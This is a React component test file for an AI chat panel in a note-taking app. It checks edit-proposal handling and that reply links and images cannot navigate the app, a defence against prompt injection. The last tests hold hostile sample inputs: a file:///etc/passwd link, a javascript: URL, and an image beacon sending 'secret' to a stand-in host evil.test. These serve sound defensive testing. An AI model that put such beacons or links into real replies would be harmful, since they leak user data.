import { describe, it, expect, vi, afterEach, beforeEach } from "vitest";
import { render, screen, cleanup, fireEvent, waitFor, act, createEvent } from "@testing-library/react";
import type { AIConfig } from "../utils/aiAssist";

// streamChat is the slow part, so it is the part held open: each test decides when
// the reply arrives, and changes what the panel is looking at in the meantime.
// parseEdits and the message builders stay real.
let reply!: (text: string) => void;
vi.mock("../utils/aiChat", async (importOriginal) => ({
    ...(await importOriginal<typeof import("../utils/aiChat")>()),
    streamChat: vi.fn(() => new Promise<string>((resolve) => { reply = resolve; })),
}));

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn(async () => {}) }));

const { AIPanel } = await import("./AIPanel");
const { streamChat } = await import("../utils/aiChat");
const { openUrl } = await import("@tauri-apps/plugin-opener");

const cfg: AIConfig = { endpoint: "https://api.test/v1/chat/completions", model: "m" };
const block = (s: string, r: string) => `<<<<<<< SEARCH\n${s}\n=======\n${r}\n>>>>>>> REPLACE`;

type Props = Parameters<typeof AIPanel>[0];
let onProposeEdit: ReturnType<typeof vi.fn<NonNullable<Props["onProposeEdit"]>>>;
const props = (over: Partial<Props>): Props => ({
    isOpen: true,
    onClose: () => {},
    note: "",
    fileName: "a.md",
    selectionText: "",
    aiConfig: cfg,
    onProposeEdit,
    ...over,
});

beforeEach(() => {
    onProposeEdit = vi.fn(() => true);
});
afterEach(cleanup);

/** Ask for an edit in Agent mode, through the panel's own controls. */
function askForEdit() {
    fireEvent.click(screen.getByRole("button", { name: "agent" }));
    fireEvent.change(screen.getByPlaceholderText(/describe the change/i), { target: { value: "fix it" } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
}

describe("AIPanel proposals belong to the document they were asked about", () => {
    it("does not propose edits made for one tab over another", async () => {
        const { rerender } = render(<AIPanel {...props({ documentId: "a", note: "A text\n" })} />);
        askForEdit();

        rerender(<AIPanel {...props({ documentId: "b", note: "B text\n" })} />);
        await act(async () => reply(block("A text", "A edited")));

        expect(onProposeEdit).not.toHaveBeenCalled();
        expect(await screen.findByText(/switched documents/i)).toBeTruthy();
    });

    // Applying the blocks to the text as it was when asked would build a review that
    // lacks everything typed since, and accepting it would undo those edits.
    it("applies the edits to the document as it is now, keeping what was typed meanwhile", async () => {
        const { rerender } = render(<AIPanel {...props({ documentId: "a", note: "Hello world.\n" })} />);
        askForEdit();

        rerender(<AIPanel {...props({ documentId: "a", note: "Hello world.\nTyped while waiting.\n" })} />);
        await act(async () => reply(block("Hello world.", "Hello, brave new world!")));

        await waitFor(() => expect(onProposeEdit).toHaveBeenCalledTimes(1));
        expect(onProposeEdit).toHaveBeenCalledWith("Hello, brave new world!\nTyped while waiting.\n", {
            documentId: "a",
            base: "Hello world.\nTyped while waiting.\n",
        });
    });

    it("says so when the app refuses the proposal", async () => {
        onProposeEdit = vi.fn(() => false);
        render(<AIPanel {...props({ documentId: "a", note: "Hello world.\n" })} />);
        askForEdit();

        await act(async () => reply(block("Hello world.", "Bye.")));

        expect(await screen.findByText(/switched documents/i)).toBeTruthy();
        expect(screen.queryByText(/Review and Accept/i)).toBeNull();
    });
});

// A reply can be steered by the open document (prompt injection), so nothing in it
// may navigate the app window: that would discard every unsaved buffer.
describe("AIPanel reply links and images never navigate the app", () => {
    async function showReply(text: string) {
        render(<AIPanel {...props({ documentId: "a", note: "Hello.\n" })} />);
        fireEvent.change(screen.getByPlaceholderText(/ask about this note/i), { target: { value: "q" } });
        fireEvent.click(screen.getByRole("button", { name: "Send" }));
        await act(async () => reply(text));
    }

    beforeEach(() => {
        // The held promise never streams tokens; a reply shows only what streamed.
        vi.mocked(streamChat).mockImplementationOnce(async (_m, _c, opts) => new Promise<string>((resolve) => {
            reply = (text) => { opts?.onToken?.(text); resolve(text); };
        }));
        vi.mocked(openUrl).mockReset();
        vi.mocked(openUrl).mockResolvedValue(undefined);
    });

    it("opens an https link through the OS opener and cancels the navigation", async () => {
        await showReply("See [the docs](https://example.com/docs).");
        const link = await screen.findByRole("link", { name: "the docs" });
        const click = createEvent.click(link);
        fireEvent(link, click);
        expect(click.defaultPrevented).toBe(true);
        expect(openUrl).toHaveBeenCalledWith("https://example.com/docs");
    });

    it("opens mailto links through the OS opener too", async () => {
        await showReply("[write](mailto:a@example.com)");
        fireEvent.click(await screen.findByRole("link", { name: "write" }));
        expect(openUrl).toHaveBeenCalledWith("mailto:a@example.com");
    });

    it("blocks middle click, which onClick never sees", async () => {
        await showReply("[x](https://example.com/)");
        const link = await screen.findByRole("link", { name: "x" });
        const aux = new MouseEvent("auxclick", { button: 1, bubbles: true, cancelable: true });
        fireEvent(link, aux);
        expect(aux.defaultPrevented).toBe(true);
        expect(link.getAttribute("draggable")).toBe("false");
    });

    it.each([
        ["a relative path", "[local](other.md)"],
        ["a fragment", "[top](#top)"],
        ["a file URL", "[f](file:///etc/passwd)"],
        ["a javascript URL", "[j](javascript:alert(1))"],
    ])("renders %s as inert text, with no href to follow", async (_label, md) => {
        await showReply(md);
        await screen.findByText(/^(local|top|f|j)$/);
        expect(screen.queryByRole("link")).toBeNull();
        expect(document.querySelector(".markdown-body a")).toBeNull();
        expect(openUrl).not.toHaveBeenCalled();
    });

    it("never loads an image, remote or linked, and shows its alt text instead", async () => {
        await showReply("![beacon](https://evil.test/p.png?d=secret) and [![pic](https://evil.test/i.png)](https://evil.test/)");
        expect(await screen.findByText("[image: beacon]")).toBeTruthy();
        expect(document.querySelector(".markdown-body img")).toBeNull();
        // The linked image is still only a link to the OS opener.
        const link = screen.getByRole("link", { name: "[image: pic]" });
        fireEvent.click(link);
        expect(openUrl).toHaveBeenCalledWith("https://evil.test/");
    });
});
